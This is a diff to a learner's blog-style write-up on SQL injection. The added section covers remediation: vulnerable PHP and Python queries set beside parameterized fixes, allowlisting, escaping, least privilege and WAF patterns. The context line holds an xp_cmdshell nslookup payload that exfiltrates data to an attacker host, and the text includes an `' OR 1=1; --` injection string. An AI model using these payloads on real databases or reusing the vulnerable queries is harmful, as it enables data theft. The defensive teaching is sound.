@@ -357,8 +357,73 @@ EXEC xp_cmdshell 'nslookup data.attacker.com';
 
 ## Remediation and Prevention
 
+## Prepared Statements (Parameterized Queries)
+
+**Vulnerable PHP code:**
+
+```php
+$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
+$result = mysqli_query($conn, $query);
+```
+
+**Fixed with prepared statements (PDO):**
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$_POST['username']]);
+$result = $stmt->fetchAll();
+```
+The `?` is a placeholder. Even when you put in `' OR 1=1; --`, it will put it in a string.
+ 
+**Vulnerable Python code:**
+ 
+```python
+ query = f"SELECT * FROM users WHERE username='{username}'"
+cursor.execute(query)
+```
+
+**Fixed Python code:**
+
+```python
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+```
+
+`%s` is a parameter placeholder and MySQL will handle the escaping and binding. 
+
+The other ways you can prevent SQL injection are:
+
+### Input Validation
+
+It controls the web input in the application before anything reaches to the database. Allowlisting defines exactly what is valid and rejects everything else. If a parameter is an numeric ID, you should check it with:
+
+```php
+if (!ctype_digit($_GET['id'])) {
+    die("Invalid input");
+}
+```
+
+There is also Blocklisting which blocks characters like `'` or `--`. But attackers can find ways around it. You have to use the validation alongside prepared statements.
+
+### Escaping User Input
+
+Escaping means putting `\` to inputs. So, `'` becomes `\'`. It can stop basic injection but it is also fragile, and database specific. You should use this as last resort.
+
+### Principle of Least Privilege
+
+This is a good principle to protect it. What it means is adding bare minimum permissions:
+
+- If the application is read-only, then it will get `SELECT` privileges and nothing else
+- No one can connect as `root` or `sa` through application
+- Locking down tables that contain sensitive data
+
+### Web Application Firewalls (WAFs)
+
+This, as per my understanding is setting up firewall rules. Like if the firewall detects `' OR 1=1`, `UNION SELECT`, `information_schema`, then it will raise an alert. Or, it will block known attack patterns.
+
 ## Practical
 
 The practical lab of this room is pretty straightforward, and there is a step by step guide on the room itself. So, I won't be including this.
 
 ## Conclusion
+
+Back in my coding days, writing `$_GET['username']` or `$_GET['id']` used to give me a satisfactory feeling, because I just learned how to add all the numbers or all the usernames through single variable (is it a variable?). But I did learn back then, that it was not a good coding practice, and it is prone to SQL injection. And I did heard of SQL injection back then, but I didn't know how it worked or how declaring, or writing like that would make the web/database vulnerable. But now, I do. 
